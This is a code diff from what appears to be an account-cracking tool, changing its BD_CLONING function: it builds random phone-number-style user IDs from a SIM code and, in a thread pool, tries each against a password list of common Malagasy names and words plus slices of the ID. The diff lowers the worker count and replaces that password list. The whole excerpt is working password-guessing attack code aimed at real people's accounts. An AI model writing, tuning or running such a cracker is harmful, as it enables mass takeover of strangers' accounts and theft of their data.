@@ -108,7 +108,7 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with tred(max_workers=82) as Dipto:
+    with tred(max_workers=50) as Dipto:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'fanantenana','Fanantenana','nirina','nirina','fanirina','Fanirina','fandresena','Fandresena','fiderana','Fiderana','jesosy','milely','Jesosy','Milely','tsilavina','Tsilavina','mamiko','Mamiko','valisoa','Valisoa','diamondra','Diamondra','antananarivo','Antananarivo','koloina','Koloina','finoana','Finoana','Sarobidy','sarobidy','fandresena','Fandresena','solofo','Solofo','malala','Malala','rakotomalala','Rakotomalala','narovana','Narovana','nantenaina','Nantenaina','faniry','Faniry','rakoto','Rakoto','fanomezana','Fanomezana','finoana','Finoana','fitiavana','Fitiavana','vadiko','Vadiko','sahaza','Sahaza','lahatra','Lahatra','nilaina','Nilaina','mihary','Mihary','tolotra','Tolotra','mirindra','Mirindra','mamitiana','Mamitiana','tantely','Tantely','sarindra','Sarindra','anjara','Anjara','nathalie','Nathalie','narindra','Narindra','harena','Harena','sitraka','Sitraka','safidy','Safidy','faneva','Faneva']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'fanantenana','Fanantenana','fiderana','Fiderana','fandresena','Fandresena','finoana','Finoana','fitiavana','Fitiavana','fitahina','Fitahina','fanomezana','Fanomezana','fanomezantsoa','Fanomezantsoa','faneva','Faneva','fanirina','Fanirina','faniry','Faniry','nirina','Nirina','valisoa','Valisoa','malala','Malala','mahery','Mahery','vololona','Vololona','milely','Milely','miora','Miora','anjara','Anjara','Narindra','narindra','narovana','Narovana','lelena','marary','Marary','mitomany','voary','Voary','voahangy']
             Dipto.submit(method_crack,ids,passlist)
             
     linex()
